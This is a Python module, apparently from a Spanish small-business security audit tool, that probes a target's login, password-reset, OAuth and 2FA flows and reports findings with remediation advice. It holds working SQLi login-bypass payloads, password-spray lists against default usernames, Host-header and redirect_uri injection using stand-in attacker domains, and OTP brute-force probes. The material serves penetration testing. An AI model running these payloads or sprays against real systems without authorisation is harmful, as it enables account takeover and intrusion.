"""
Módulo de auditoría de autenticación — AuditPyme
Detecta: login bypass SQLi, fuerza bruta sin rate limiting, enumeración de usuarios,
spray de contraseñas comunes y problemas de gestión de sesión.
"""

import requests
import urllib3
import re
import time
import hashlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
TIMEOUT = 10
UA = "Mozilla/5.0 (compatible; AuditPyme/1.0)"

# Payloads de bypass de autenticación vía SQLi
LOGIN_BYPASS_PAYLOADS = [
    ("' OR '1'='1'--",     ""),               # clásico MySQL
    ("' OR 1=1--",         ""),
    ("admin'--",           ""),               # comentar la comprobación de password
    ("admin'#",            ""),               # MySQL comment
    ('" OR "1"="1"--',     ""),
    ("' OR 1=1#",          "x"),
    ("') OR ('1'='1'--",   ""),               # cierre de paréntesis
    ("' OR 1=1 LIMIT 1--", ""),
    ("admin' OR '1'='1",   "cualquiera"),     # sin comentario final
    ("' OR 'x'='x",        "' OR 'x'='x"),
    ("1' OR '1' = '1')) /*", ""),             # doble paréntesis
    ("' OR 1=1 --",        " "),              # espacio después del --
    ("\\",                 ""),               # escape character
    ("' OR true--",        ""),               # boolean moderno
    ("' || '1'='1'--",     ""),               # concatenación Oracle/PostgreSQL
]

# Contraseñas más usadas en pymes españolas + globales (spray conservador)
COMMON_PASSWORDS = [
    "123456", "password", "123456789", "12345678", "12345",
    "1234567", "qwerty", "abc123", "111111", "dragon",
    "admin", "Admin1", "Admin123", "admin123", "Admin1234",
    "empresa", "empresa1", "empresa123",
    "temporal", "Temporal1", "pass1234",
    "Welcome1", "welcome123", "letmein",
    "P@ssw0rd", "Password1", "Passw0rd",
    "Summer2024", "Winter2024", "Spring2025",
    "Verano2024", "Verano2025", "Enero2025",
]

# Indicadores de login exitoso en la respuesta
SUCCESS_INDICATORS = [
    "dashboard", "panel", "bienvenido", "welcome", "logout",
    "cerrar sesión", "sign out", "mi cuenta", "my account",
    "perfil", "profile", "inicio", "home", "salir",
]

# Indicadores de login fallido
FAILURE_INDICATORS = [
    "contraseña incorrecta", "password incorrect", "wrong password",
    "invalid", "inválido", "error", "failed", "fallido",
    "no existe", "not found", "incorrecto", "incorrect",
    "usuario o contraseña", "username or password",
]


class AuthAuditor:
    def __init__(self, target: str, recon_data: dict = None, stealth: bool = False):
        self.target = target
        self.recon_data = recon_data or {}
        self.findings = []
        self.stealth = stealth
        self.delay = 1.0 if stealth else 0.2
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": UA})
        self.session.verify = False
        self._base_urls = self._build_base_urls()

    def scan(self) -> list:
        print(f"\n  [*] Auditoría de autenticación en: {self.target}")
        for base_url in self._base_urls:
            self._check_password_reset(base_url)
            self._check_oauth(base_url)
            login_info = self._find_login_form(base_url)
            if not login_info:
                print(f"  [-] No se encontró formulario de login en {base_url}")
                continue
            login_url, user_field, pass_field, extra_fields = login_info
            print(f"  [+] Login encontrado: {login_url} (user={user_field}, pass={pass_field})")

            self._check_login_bypass(login_url, user_field, pass_field, extra_fields)
            self._check_rate_limiting(login_url, user_field, pass_field, extra_fields)
            self._check_user_enumeration(login_url, user_field, pass_field, extra_fields)
            self._check_password_spray(login_url, user_field, pass_field, extra_fields)
            self._check_session_fixation(base_url, login_url)
            self._check_2fa_bypass(base_url, login_url, user_field, pass_field, extra_fields)

        if not self.findings:
            print("  [OK] No se detectaron vulnerabilidades críticas de autenticación")
        return self.findings

    # ── Descubrimiento del formulario de login ────────────────────────────────

    def _find_login_form(self, base_url: str):
        """Busca formulario de login en rutas comunes. Devuelve (url, user_field, pass_field, extra)."""
        login_paths = [
            "/login", "/login.php", "/login.asp", "/login.aspx",
            "/wp-login.php", "/admin/login", "/administrator",
            "/admin", "/user/login", "/cuenta/login", "/acceder",
            "/signin", "/sign-in", "/auth/login", "/panel/login",
            "/wp-admin", "/backend/login", "/backoffice", "/cms/login",
            "/shop/login", "/tienda/login", "/clientes/login",
        ]
        for path in login_paths:
            url = base_url.rstrip("/") + path
            try:
                r = self.session.get(url, timeout=TIMEOUT, allow_redirects=True)
                if r.status_code != 200:
                    continue
                form_info = self._parse_login_form(r.text, r.url)
                if form_info:
                    return form_info
            except Exception:
                continue
        return None

    def _parse_login_form(self, html: str, page_url: str):
        """Extrae campos user/pass de un formulario HTML."""
        # Buscar formularios con campos de password
        forms = re.findall(r'<form[^>]*>(.*?)</form>', html, re.IGNORECASE | re.DOTALL)
        for form_html in forms:
            inputs = re.findall(r'<input[^>]+>', form_html, re.IGNORECASE)
            fields = {}
            for tag in inputs:
                name_m  = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
                type_m  = re.search(r'type=["\']([^"\']+)["\']', tag, re.IGNORECASE)
                value_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.IGNORECASE)
                if name_m:
                    fields[name_m.group(1)] = {
                        "type":  type_m.group(1).lower() if type_m else "text",
                        "value": value_m.group(1) if value_m else "",
                    }

            pass_field = next((n for n, v in fields.items() if v["type"] == "password"), None)
            if not pass_field:
                continue
            user_field = next(
                (n for n in fields if any(k in n.lower() for k in ("user", "email", "login", "nombre", "name"))),
                next((n for n, v in fields.items() if v["type"] in ("text", "email")), None)
            )
            if not user_field:
                continue

            # Campos extra (tokens CSRF, hidden fields)
            extra = {n: v["value"] for n, v in fields.items()
                     if n not in (user_field, pass_field) and v["type"] != "submit"}
            return (page_url, user_field, pass_field, extra)
        return None

    # ── Check 1: Login bypass vía SQLi ───────────────────────────────────────

    def _check_login_bypass(self, login_url, user_field, pass_field, extra):
        print("  [*] Probando login bypass SQLi...")
        for user_payload, pass_payload in LOGIN_BYPASS_PAYLOADS:
            time.sleep(self.delay)
            data = dict(extra)
            data[user_field] = user_payload
            data[pass_field] = pass_payload or "cualquiera"
            try:
                r = self.session.post(login_url, data=data, timeout=TIMEOUT, allow_redirects=True)
                if self._looks_like_success(r):
                    self._add(
                        "CRITICAL", "Login Bypass — Inyección SQL en autenticación",
                        f"Login bypass con payload '{user_payload}' en campo '{user_field}'. "
                        f"Respuesta HTTP {r.status_code} con indicadores de sesión activa.",
                        "El formulario de login concatena el input del usuario directamente en la consulta SQL. "
                        "Un atacante puede autenticarse como administrador sin conocer ninguna contraseña, "
                        "obteniendo acceso completo a la aplicación y sus datos.",
                        "Usar sentencias preparadas (PDO/PreparedStatement) para todas las consultas de autenticación. "
                        "Nunca concatenar input del usuario en SQL."
                    )
                    print(f"  [CRITICAL] Login bypass exitoso con: {user_payload[:50]}")
                    return  # Con uno es suficiente
            except Exception:
                continue
        print("  [OK] Login bypass SQLi no detectado")

    # ── Check 2: Rate limiting en login ──────────────────────────────────────

    def _check_rate_limiting(self, login_url, user_field, pass_field, extra):
        print("  [*] Comprobando rate limiting en login...")
        intentos = 20
        bloqueado = False
        tiempos = []

        for i in range(intentos):
            data = dict(extra)
            data[user_field] = "admin"
            data[pass_field] = f"password_falso_{i}"
            try:
                t0 = time.time()
                r = self.session.post(login_url, data=data, timeout=TIMEOUT, allow_redirects=False)
                elapsed = time.time() - t0
                tiempos.append(elapsed)
                # Signos de bloqueo: 429, redirect a captcha, respuesta muy lenta
                if r.status_code == 429:
                    bloqueado = True
                    print(f"  [OK] Rate limiting activo (HTTP 429 en intento {i+1})")
                    break
                if "captcha" in r.text.lower() or "locked" in r.text.lower() or "bloqueado" in r.text.lower():
                    bloqueado = True
                    print(f"  [OK] Protección detectada (captcha/bloqueo en intento {i+1})")
                    break
                # Introducir pequeño delay para no saturar
                time.sleep(0.1)
            except Exception:
                break

        if not bloqueado:
            avg = sum(tiempos) / len(tiempos) if tiempos else 0
            self._add(
                "HIGH", "Sin rate limiting en formulario de login",
                f"{intentos} intentos de login fallidos consecutivos sin ningún bloqueo ni ralentización "
                f"(tiempo medio de respuesta: {avg:.2f}s).",
                "Sin rate limiting, un atacante puede probar millones de contraseñas automáticamente (fuerza bruta). "
                "Muchas pymes usan contraseñas predecibles — con 1000 intentos se suele comprometer al menos una cuenta.",
                "Implementar bloqueo de cuenta tras 5-10 intentos fallidos, CAPTCHA después del 3er intento, "
                "y rate limiting por IP (máx. 10 req/min en /login). Usar frameworks como fail2ban o mod_evasive."
            )
            print(f"  [HIGH] Sin rate limiting — {intentos} intentos sin bloqueo")

    # ── Check 3: Enumeración de usuarios ─────────────────────────────────────

    def _check_user_enumeration(self, login_url, user_field, pass_field, extra):
        print("  [*] Comprobando enumeración de usuarios...")
        test_users = [
            ("admin",          "pass_falso_123"),
            ("usuario_falso_xyzabc999", "pass_falso_123"),
        ]
        responses = []
        for user, pwd in test_users:
            time.sleep(self.delay)
            data = dict(extra)
            data[user_field] = user
            data[pass_field] = pwd
            try:
                r = self.session.post(login_url, data=data, timeout=TIMEOUT, allow_redirects=True)
                responses.append((user, r.status_code, len(r.text), r.text[:300].lower()))
            except Exception:
                responses.append((user, 0, 0, ""))

        if len(responses) == 2:
            _, sc1, len1, body1 = responses[0]
            _, sc2, len2, body2 = responses[1]
            # Diferencia en código de estado o tamaño de respuesta >5%
            size_diff = abs(len1 - len2) / max(len1, 1)
            if sc1 != sc2 or size_diff > 0.05:
                self._add(
                    "MEDIUM", "Enumeración de usuarios posible",
                    f"Respuestas distintas para usuario válido vs inválido: "
                    f"HTTP {sc1} ({len1} bytes) vs HTTP {sc2} ({len2} bytes). "
                    f"Diferencia de tamaño: {size_diff*100:.0f}%.",
                    "El servidor devuelve mensajes distintos según si el usuario existe o no. "
                    "Un atacante puede enumerar usuarios válidos del sistema, facilitando ataques dirigidos.",
                    "Usar siempre el mismo mensaje de error independientemente del motivo: "
                    "'Credenciales incorrectas' (nunca 'usuario no encontrado' vs 'contraseña incorrecta'). "
                    "El tiempo de respuesta también debe ser constante (usar timing-safe comparison)."
                )
                print(f"  [MEDIUM] Enumeración de usuarios posible (diff tamaño: {size_diff*100:.0f}%)")
            else:
                print("  [OK] Respuestas consistentes — enumeración no detectada")

    # ── Check 4: Password spray con contraseñas comunes ───────────────────────

    def _check_password_spray(self, login_url, user_field, pass_field, extra):
        print(f"  [*] Password spray ({len(COMMON_PASSWORDS)} contraseñas comunes)...")
        users_to_try = ["admin", "administrator", "user", "usuario", "webmaster", "info"]

        for user in users_to_try:
            for pwd in COMMON_PASSWORDS:
                time.sleep(self.delay)
                data = dict(extra)
                data[user_field] = user
                data[pass_field] = pwd
                try:
                    r = self.session.post(login_url, data=data, timeout=TIMEOUT, allow_redirects=True)
                    if self._looks_like_success(r):
                        self._add(
                            "CRITICAL", f"Credenciales débiles — acceso con {user}:{pwd}",
                            f"Login exitoso con usuario '{user}' y contraseña '{pwd}'. "
                            f"HTTP {r.status_code}, URL final: {r.url[:80]}",
                            f"La cuenta '{user}' usa una contraseña extremadamente común que cualquier atacante "
                            f"probaría en los primeros intentos de un ataque automatizado.",
                            f"Cambiar la contraseña de '{user}' inmediatamente por una de al menos 12 caracteres "
                            "con mayúsculas, minúsculas, números y símbolos. "
                            "Considerar autenticación de doble factor (2FA) para cuentas de administrador."
                        )
                        print(f"  [CRITICAL] Acceso con {user}:{pwd}")
                        return
                except Exception:
                    continue
        print("  [OK] Password spray no encontró credenciales válidas")

    # ── Check 5: Session fixation / no regeneración de sesión ────────────────

    def _check_session_fixation(self, base_url, login_url):
        print("  [*] Comprobando gestión de sesión...")
        try:
            # Obtener cookie antes del login
            sess_antes = requests.Session()
            sess_antes.headers.update({"User-Agent": UA})
            sess_antes.verify = False
            r1 = sess_antes.get(login_url, timeout=TIMEOUT)
            cookies_antes = dict(sess_antes.cookies)
            session_id_antes = self._extract_session_id(cookies_antes)

            # Comprobar si la app usa HTTPS para las cookies de sesión
            for name, cookie in sess_antes.cookies._cookies.get("", {}).get("/", {}).items():
                if any(s in name.lower() for s in ("session", "sess", "sid", "phpsessid", "jsessionid")):
                    if not getattr(cookie, "secure", False):
                        self._add(
                            "HIGH", f"Cookie de sesión '{name}' sin flag Secure",
                            f"La cookie de sesión '{name}' no tiene el atributo Secure. "
                            "Si el usuario accede por HTTP (aunque sea una sola vez), "
                            "la cookie puede ser interceptada en redes WiFi públicas.",
                            "Un atacante en la misma red WiFi puede robar la sesión activa del usuario "
                            "(session hijacking), obteniendo acceso completo a su cuenta sin conocer la contraseña.",
                            f"Añadir el atributo Secure a la cookie '{name}': "
                            "setcookie(name, value, ['secure'=>true, 'httponly'=>true, 'samesite'=>'Strict']). "
                            "Forzar HTTPS en toda la aplicación."
                        )
                        print(f"  [HIGH] Cookie '{name}' sin flag Secure")
                    if not getattr(cookie, "has_nonstandard_attr", lambda x: False)("HttpOnly"):
                        if "httponly" not in str(cookie).lower():
                            self._add(
                                "MEDIUM", f"Cookie de sesión '{name}' sin flag HttpOnly",
                                f"La cookie '{name}' no tiene HttpOnly — accesible via JavaScript (document.cookie).",
                                "Si hay XSS en la aplicación, un atacante puede robar todas las sesiones activas "
                                "con un simple script: document.cookie.",
                                f"Añadir HttpOnly a la cookie '{name}'. "
                                "En PHP: session_set_cookie_params(['httponly'=>true])."
                            )
                            print(f"  [MEDIUM] Cookie '{name}' sin HttpOnly")
        except Exception:
            pass

    # ── Check 6: Password reset flaws ────────────────────────────────────────

    def _check_password_reset(self, base_url: str):
        """
        Detecta fallos en el reset de contraseña:
        - Host header injection: el email de reset incluye el host del atacante
        - Token en URL (GET-based reset = token expuesto en logs/referrer)
        - Reset sin rate limiting
        - Token predecible (hash MD5/SHA1 del email o timestamp)
        """
        RESET_PATHS = [
            "/forgot-password", "/forgot_password", "/password-reset",
            "/reset-password", "/password/reset", "/account/forgot",
            "/user/forgot", "/users/password/new", "/auth/forgot",
            "/recuperar", "/recuperar-contrasena", "/olvide-contrasena",
            "/wp-login.php?action=lostpassword",
        ]
        print(f"  [*] Comprobando password reset en {base_url}...")

        reset_url = None
        email_field = None

        for path in RESET_PATHS:
            url = base_url.rstrip("/") + path
            try:
                resp = self.session.get(url, timeout=TIMEOUT, allow_redirects=True)
                if resp.status_code != 200:
                    continue
                # Buscar campo de email
                forms = re.findall(r'<form[^>]*>(.*?)</form>', resp.text, re.IGNORECASE | re.DOTALL)
                for form_html in forms:
                    inputs = re.findall(r'<input[^>]+>', form_html, re.IGNORECASE)
                    for tag in inputs:
                        name_m = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
                        type_m = re.search(r'type=["\']([^"\']+)["\']', tag, re.IGNORECASE)
                        if name_m and type_m and type_m.group(1).lower() in ("email", "text"):
                            if any(k in name_m.group(1).lower() for k in ("email", "user", "login")):
                                reset_url = resp.url
                                email_field = name_m.group(1)
                                break
                    if email_field:
                        break
                if email_field:
                    break
            except Exception:
                continue

        if not reset_url:
            print("  [-] Endpoint de password reset no encontrado")
            return

        print(f"  [+] Reset endpoint: {reset_url} (campo: {email_field})")

        # Test 1: Host header injection
        try:
            time.sleep(self.delay)
            evil_host = "attacker-auditpyme.com"
            r = self.session.post(reset_url,
                                  data={email_field: "admin@test.com"},
                                  timeout=TIMEOUT,
                                  allow_redirects=True,
                                  headers={
                                      "Host": evil_host,
                                      "X-Forwarded-Host": evil_host,
                                      "X-Host": evil_host,
                                  })
            # Si la respuesta es exitosa y no muestra error de host inválido
            body = r.text.lower()
            if r.status_code in (200, 302) and any(
                w in body for w in ("email sent", "email enviado", "check your email",
                                    "revisa tu correo", "sent", "enviado", "link sent",
                                    "instructions", "instrucciones")
            ):
                self._add(
                    "HIGH",
                    "Password reset — posible Host Header Injection",
                    f"El endpoint de reset ({reset_url}) aceptó una petición con Host: {evil_host} "
                    f"y devolvió respuesta de éxito (HTTP {r.status_code}). "
                    "Si el servidor construye el enlace de reset usando el header Host, "
                    "el email enviado a la víctima contendrá un enlace al dominio del atacante.",
                    "Un atacante puede solicitar reset para la cuenta de la víctima con Host: attacker.com. "
                    "La víctima recibe: 'Haz clic aquí para resetear: https://attacker.com/reset?token=...' "
                    "y cuando pincha, el token llega al servidor del atacante.",
                    "Nunca construir URLs de reset usando el header Host de la petición. "
                    "Hardcodear el dominio base en la configuración del servidor. "
                    "En Django: USE_X_FORWARDED_HOST = False. En Laravel: APP_URL en .env."
                )
                print(f"  [HIGH] Host Header Injection en password reset")
        except Exception:
            pass

        # Test 2: Token en URL (reset link via GET)
        try:
            # Comprobar si la app tiene tokens en la URL de la página actual
            for test_path in ["/reset-password?token=test123", "/password/reset?t=abc123",
                               "/users/password/edit?reset_password_token=abc123"]:
                url = base_url.rstrip("/") + test_path
                r = self.session.get(url, timeout=TIMEOUT, allow_redirects=True)
                if r.status_code == 200 and any(
                    w in r.text.lower() for w in ("new password", "nueva contraseña",
                                                   "reset", "token", "password")
                ):
                    self._add(
                        "MEDIUM",
                        "Token de reset en parámetro GET de la URL",
                        f"El enlace de reset incluye el token en la URL ({test_path}). "
                        "Esto expone el token en: logs del servidor, header Referer (al navegar a otro sitio), "
                        "historial del navegador y herramientas de análisis como Google Analytics.",
                        "El token de reset puede filtrarse a terceros a través del header Referer "
                        "si la página de reset carga recursos externos (scripts, imágenes, analytics). "
                        "Un atacante con acceso a los logs puede usar el token sin conocer la contraseña.",
                        "Enviar el token via POST en lugar de GET. "
                        "Usar tokens de un solo uso (invalidar tras el primer uso). "
                        "Invalidar el token tras 15 minutos si no se usa."
                    )
                    print(f"  [MEDIUM] Token de reset en URL: {test_path}")
                    break
        except Exception:
            pass

        # Test 3: Rate limiting en reset
        try:
            bloqueado = False
            for i in range(10):
                time.sleep(0.1)
                r = self.session.post(reset_url,
                                      data={email_field: f"test{i}@example.com"},
                                      timeout=TIMEOUT, allow_redirects=False)
                if r.status_code == 429 or "captcha" in r.text.lower() or "bloqueado" in r.text.lower():
                    bloqueado = True
                    print(f"  [OK] Rate limiting en password reset (intento {i+1})")
                    break
            if not bloqueado:
                self._add(
                    "MEDIUM",
                    "Sin rate limiting en password reset",
                    f"10 peticiones de reset consecutivas sin bloqueo en {reset_url}.",
                    "Un atacante puede inundar el buzón de cualquier usuario con emails de reset, "
                    "causando denegación de servicio de correo. También facilita ataques de enumeración "
                    "de usuarios por timing si hay diferencia entre usuario existente y no existente.",
                    "Limitar a 3-5 peticiones de reset por IP por hora. "
                    "Añadir CAPTCHA tras el 2º intento. "
                    "Devolver siempre el mismo mensaje independientemente de si el email existe."
                )
                print(f"  [MEDIUM] Sin rate limiting en password reset")
        except Exception:
            pass

    # ── Check 7: OAuth 2.0 ────────────────────────────────────────────────────

    def _check_oauth(self, base_url: str):
        """Detecta flujos OAuth expuestos y prueba fallos comunes."""
        print(f"  [*] Buscando flujos OAuth en {base_url}...")

        # Detectar botones/enlaces OAuth en la página
        oauth_patterns = [
            r'href=["\']([^"\']*(?:oauth|authorize|auth/google|auth/facebook|'
            r'auth/github|login/google|login/facebook|connect/google|'
            r'sso|saml|openid)[^"\']*)["\']',
        ]
        oauth_urls = []
        try:
            r = self.session.get(base_url, timeout=TIMEOUT)
            for pat in oauth_patterns:
                for m in re.finditer(pat, r.text, re.IGNORECASE):
                    url = m.group(1)
                    if not url.startswith("http"):
                        url = base_url.rstrip("/") + "/" + url.lstrip("/")
                    oauth_urls.append(url)
        except Exception:
            pass

        # También buscar endpoints OAuth comunes
        common_oauth_paths = [
            "/oauth/authorize", "/oauth2/authorize", "/auth/authorize",
            "/connect/authorize", "/api/oauth/authorize",
            "/login/oauth/authorize", "/.well-known/openid-configuration",
        ]
        for path in common_oauth_paths:
            url = base_url.rstrip("/") + path
            try:
                r = self.session.get(url, timeout=TIMEOUT, allow_redirects=False)
                if r.status_code in (200, 302, 400):
                    oauth_urls.append(url)
            except Exception:
                pass

        if not oauth_urls:
            print("  [-] No se detectaron flujos OAuth")
            return

        print(f"  [+] Flujos OAuth detectados: {len(oauth_urls)}")
        for oauth_url in oauth_urls[:3]:
            self._test_oauth_state(oauth_url)
            self._test_oauth_redirect_uri(oauth_url)

    def _test_oauth_state(self, oauth_url: str):
        """Verifica si el parámetro state es obligatorio (protección CSRF)."""
        try:
            # Petición sin parámetro state
            test_url = oauth_url
            if "?" not in oauth_url:
                test_url += "?client_id=test&response_type=code&redirect_uri=https://example.com/callback"
            r = self.session.get(test_url, timeout=TIMEOUT, allow_redirects=False)

            # Si redirige sin requerir state → posible CSRF OAuth
            if r.status_code == 302:
                loc = r.headers.get("Location", "")
                if "state" not in loc and "error" not in loc.lower():
                    self._add(
                        "HIGH",
                        "OAuth — Parámetro state no requerido (CSRF posible)",
                        f"El endpoint OAuth {oauth_url} redirige sin validar el parámetro 'state'. "
                        "Petición de prueba devolvió redirect sin state.",
                        "Un atacante puede realizar un ataque CSRF para vincular la cuenta de la víctima "
                        "con la cuenta del atacante (account linking attack) o completar un flujo OAuth "
                        "en nombre de la víctima sin su consentimiento.",
                        "Generar un 'state' criptográficamente aleatorio en cada solicitud de autorización. "
                        "Validar que el state recibido en el callback coincide con el enviado. "
                        "Rechazar peticiones sin state o con state no reconocido."
                    )
                    print(f"  [HIGH] OAuth sin state en {oauth_url}")
        except Exception:
            pass

    def _test_oauth_redirect_uri(self, oauth_url: str):
        """Prueba si redirect_uri puede ser manipulada para exfiltrar tokens."""
        evil_redirects = [
            "https://attacker-auditpyme.com/callback",
            "https://example.com.attacker.com/callback",
            "https://example.com/callback/../../../attacker",
            "https://example.com/callback?extra=https://attacker.com",
        ]
        try:
            parsed = re.search(r'redirect_uri=([^&]+)', oauth_url)
            if not parsed:
                return
            for evil_uri in evil_redirects[:2]:
                test_url = re.sub(r'redirect_uri=[^&]+', f'redirect_uri={evil_uri}', oauth_url)
                r = self.session.get(test_url, timeout=TIMEOUT, allow_redirects=False)
                if r.status_code == 302:
                    loc = r.headers.get("Location", "")
                    if "attacker" in loc or "error" not in loc.lower():
                        self._add(
                            "CRITICAL",
                            "OAuth — redirect_uri no validada (robo de tokens)",
                            f"El servidor OAuth acepta redirect_uri arbitraria en {oauth_url}. "
                            f"redirect_uri probada: {evil_uri} → respuesta: HTTP {r.status_code}",
                            "Un atacante puede reemplazar el redirect_uri por su propio servidor y "
                            "recibir el authorization code o access token de la víctima, "
                            "obteniendo acceso completo a su cuenta.",
                            "Validar redirect_uri contra una lista blanca exacta registrada en el servidor. "
                            "No permitir coincidencias parciales ni wildcards. "
                            "Rechazar cualquier redirect_uri no registrada exactamente."
                        )
                        print(f"  [CRITICAL] OAuth redirect_uri bypass: {evil_uri}")
                        return
        except Exception:
            pass

    # ── Check 8: 2FA bypass ───────────────────────────────────────────────────

    def _check_2fa_bypass(self, base_url: str, login_url: str,
                          user_field: str, pass_field: str, extra: dict):
        """Detecta páginas de 2FA y prueba bypasses comunes."""
        print("  [*] Buscando y probando 2FA bypass...")

        # Buscar si hay paso de 2FA después del login
        twofa_patterns = [
            r'type=["\']number["\'][^>]*name=["\']([^"\']*(?:otp|code|token|2fa|totp|mfa)[^"\']*)["\']',
            r'name=["\']([^"\']*(?:otp|code|verification|2fa|totp|mfa|pin)[^"\']*)["\']',
        ]

        twofa_url = None
        twofa_field = None

        # Buscar directamente en rutas comunes de 2FA
        twofa_paths = [
            "/two-factor", "/2fa", "/mfa", "/otp", "/verify",
            "/auth/2fa", "/user/2fa", "/account/2fa",
            "/login/2fa", "/login/verify", "/authenticate",
        ]

        for path in twofa_paths:
            url = base_url.rstrip("/") + path
            try:
                r = self.session.get(url, timeout=TIMEOUT)
                if r.status_code == 200:
                    for pat in twofa_patterns:
                        m = re.search(pat, r.text, re.IGNORECASE)
                        if m:
                            twofa_url = url
                            twofa_field = m.group(1)
                            break
                if twofa_url:
                    break
            except Exception:
                pass

        if not twofa_url:
            print("  [-] Página de 2FA no detectada")
            return

        print(f"  [+] Página de 2FA detectada: {twofa_url} (campo: {twofa_field})")

        # Test 1: Bypass directo — acceder a área protegida sin pasar por 2FA
        protected_paths = ["/dashboard", "/admin", "/panel", "/home", "/account"]
        for ppath in protected_paths:
            try:
                r = self.session.get(base_url.rstrip("/") + ppath, timeout=TIMEOUT)
                if r.status_code == 200 and not any(
                    w in r.url.lower() for w in ("login", "2fa", "verify", "otp")
                ):
                    self._add(
                        "CRITICAL",
                        "2FA bypass — acceso directo a área protegida sin verificar OTP",
                        f"Es posible acceder a {ppath} sin completar el paso de 2FA. "
                        f"La sesión establecida en el login no requiere la verificación OTP.",
                        "Un atacante con credenciales robadas puede eludir el 2FA navegando "
                        "directamente a páginas protegidas, haciendo el 2FA completamente inútil.",
                        "Implementar verificación de 2FA como middleware en TODAS las rutas protegidas. "
                        "Usar un flag de sesión 'mfa_verified' que se compruebe antes de servir cualquier "
                        "recurso autenticado."
                    )
                    print(f"  [CRITICAL] 2FA bypass directo en {ppath}")
                    return
            except Exception:
                pass

        # Test 2: Código de prueba triviales (sin fuerza bruta exhaustiva)
        trivial_codes = [
            "000000", "123456", "111111", "123123", "654321",
            "000001", "999999", "112233", "121212",
        ]

        bloqueado = False
        for code in trivial_codes:
            try:
                time.sleep(self.delay)
                r = self.session.post(twofa_url, data={twofa_field: code},
                                      timeout=TIMEOUT, allow_redirects=False)
                if r.status_code == 429 or "locked" in r.text.lower() or "bloqueado" in r.text.lower():
                    bloqueado = True
                    print(f"  [OK] 2FA rate limiting activo (código {code})")
                    break
            except Exception:
                pass

        if not bloqueado:
            self._add(
                "HIGH",
                "2FA — Sin rate limiting en página de verificación OTP",
                f"Se enviaron {len(trivial_codes)} códigos OTP a {twofa_url} sin recibir bloqueo ni 429.",
                "Sin rate limiting en el paso de 2FA, un atacante puede hacer fuerza bruta "
                "de los 1.000.000 códigos TOTP de 6 dígitos. Con 100 req/s se agota en ~3 horas. "
                "Si el código no caduca rápido (30s estándar TOTP) el ataque es más rápido.",
                "Implementar rate limiting en el endpoint de verificación OTP: "
                "máx. 5 intentos, después bloqueo de cuenta o CAPTCHA. "
                "Invalidar el código tras cada intento fallido (TOTP ya lo hace, pero verificarlo)."
            )
            print(f"  [HIGH] 2FA sin rate limiting — {len(trivial_codes)} intentos sin bloqueo")

        # Test 3: Reutilización de código — probar el mismo código dos veces
        if not bloqueado and trivial_codes:
            last_code = trivial_codes[0]
            try:
                time.sleep(self.delay)
                r1 = self.session.post(twofa_url, data={twofa_field: last_code},
                                       timeout=TIMEOUT, allow_redirects=False)
                time.sleep(0.5)
                r2 = self.session.post(twofa_url, data={twofa_field: last_code},
                                       timeout=TIMEOUT, allow_redirects=False)
                # Si el segundo intento NO devuelve error de código ya usado
                if (r1.status_code == r2.status_code and
                        "invalid" not in r2.text.lower() and
                        "used" not in r2.text.lower() and
                        "already" not in r2.text.lower()):
                    self._add(
                        "MEDIUM",
                        "2FA — Posible reutilización de código OTP",
                        f"El mismo código OTP fue aceptado dos veces en {twofa_url} "
                        "sin error de 'código ya utilizado'.",
                        "Si el servidor no invalida el OTP tras el primer uso, un atacante "
                        "que intercepte el código (phishing en tiempo real) puede reutilizarlo "
                        "para autenticarse después de que la víctima ya lo haya usado.",
                        "Invalidar cada código OTP inmediatamente tras su primer uso. "
                        "Para TOTP: rechazar el mismo counter/timestamp si ya fue validado. "
                        "Mantener una lista de tokens TOTP ya usados en el último intervalo."
                    )
                    print("  [MEDIUM] Posible reutilización de código OTP")
            except Exception:
                pass

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _looks_like_success(self, response) -> bool:
        """Determina si la respuesta indica un login exitoso."""
        url = response.url.lower()
        body = response.text.lower()
        # Redirigido fuera del login → éxito
        if response.history and "login" not in url and "error" not in url:
            return True
        # Indicadores en el body
        if any(ind in body for ind in SUCCESS_INDICATORS):
            if not any(fail in body for fail in FAILURE_INDICATORS):
                return True
        return False

    def _extract_session_id(self, cookies: dict) -> str:
        for name in cookies:
            if any(s in name.lower() for s in ("session", "sess", "sid", "phpsessid")):
                return cookies[name]
        return ""

    def _build_base_urls(self) -> list:
        urls = []
        for host in self.recon_data.get("hosts", []):
            if host["estado"] != "up":
                continue
            for p in host["puertos"]:
                port = p["puerto"]
                svc = p["servicio"].lower()
                if "http" in svc or port in (80, 443, 8080, 8443, 8888):
                    proto = "https" if port in (443, 8443) else "http"
                    url = (f"{proto}://{self.target}:{port}"
                           if port not in (80, 443) else f"{proto}://{self.target}")
                    if url not in urls:
                        urls.append(url)
        return urls or [f"https://{self.target}"]

    def _add(self, severidad, nombre, descripcion, impacto, recomendacion):
        for f in self.findings:
            if f["nombre"] == nombre:
                return
        self.findings.append({
            "severidad":     severidad,
            "tipo":          "AUTENTICACIÓN",
            "nombre":        nombre,
            "descripcion":   descripcion,
            "impacto":       impacto,
            "recomendacion": recomendacion,
        })
